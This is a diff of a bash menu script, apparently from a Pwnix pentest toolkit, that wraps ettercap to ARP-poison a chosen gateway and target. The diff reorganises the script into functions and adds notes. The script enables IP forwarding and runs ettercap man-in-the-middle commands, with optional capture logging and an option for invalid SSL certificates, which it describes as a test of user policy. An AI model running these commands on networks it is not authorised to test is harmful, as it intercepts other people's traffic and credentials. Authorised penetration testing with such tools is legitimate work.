@@ -7,6 +7,9 @@ f_interface(){
 
 echo 
 echo "		Ettercap-NG 0.8.0 ARP Cache Poison Script"
+echo
+echo "    NOTE: This only works on networks you are connected to"
+echo "          DO NOT USE WITH EVILAP - IT WON'T WORK"
 echo 
 echo "Select which interface you would like to sniff / poison on? (1-6):"
 echo 
@@ -35,7 +38,6 @@ f_wlan0(){
         interface=wlan0
 }
 
-
 #########################################
 f_wlan1(){
         interface=wlan1
@@ -47,9 +49,11 @@ f_sslfake(){
 clear
 
 echo 
-echo "Would you like to use the Invalid SSL Cert Option?"
+echo "        Would you like to use the Invalid SSL Cert Option?"
 echo
-echo "NOTE: if using SSLstrip with ettercap this is not needed"
+echo "Good for testing user policy to make sure users aren't accpeting bad certs!"
+echo
+echo "      NOTE: if using SSLstrip with ettercap this is not needed"
 echo
 echo "1. Yes"
 echo "2. No "
@@ -57,10 +61,26 @@ echo
 read -p "Choice: " sslfakecert
 }
 
+#########################################
+f_logging(){
 
-f_interface
+clear
+echo 
+echo "Would you like to log data?"
+echo
+echo "Captures saved to /opt/pwnix/captures/ettercap/"
+echo
+echo "1. Yes"
+echo "2. No "
+echo
 
-#Define filename for logging
+read -p "Choice: " logchoice
+}
+
+#########################################
+f_run(){
+
+echo 1 > /proc/sys/net/ipv4/ip_forward
 
 filename=/opt/pwnix/captures/ettercap/ettercap$(date +%F-%H%M)
 
@@ -74,42 +94,40 @@ echo
 read -p "Enter Target IP of Gateway / Router: " gw
 echo 
 
-clear
-echo 
-echo "Would you like to log data?"
-echo
-echo "Captures saved to /opt/pwnix/captures/ettercap/"
-echo
-echo "1. Yes"
-echo "2. No "
-echo
 
-read -p "Choice: " logchoice
-
-echo 1 > /proc/sys/net/ipv4/ip_forward
 
 if [ $logchoice -eq 1 ] 
 then
 
 
+  if [ $sslfakecert -eq 1 ] 
+  then
 
-	ettercap -i $interface -T -q -l $filename -M arp:remote /$gw/ /$target1/
+	  ettercap -i $interface -T -q -l $filename -M arp:remote /$gw/ /$target1/
 
-else
+  else
 
-ettercap -i $interface -T -q -M arp:remote /$gw/ /$target1/
+    ettercap -i $interface -T -S -q -l $filename -M arp:remote /$gw/ /$target1/
 
-fi
-
-#
-if [ $sslfakecert -eq 1 ] 
-then
-
-
-	ettercap -i $interface -T -q -l $filename -M arp:remote /$gw/ /$target1/
+  fi
 
 else
 
-ettercap -i $interface -T -S -q -M arp:remote /$gw/ /$target1/
+  if [ $sslfakecert -eq 1 ] 
+  then
+
+	  ettercap -i $interface -T -q -M arp:remote /$gw/ /$target1/
+
+  else
+
+    ettercap -i $interface -T -S -q -M arp:remote /$gw/ /$target1/
+
+  fi
 
 fi
+}
+
+f_interface
+f_sslfake
+f_logging
+f_run
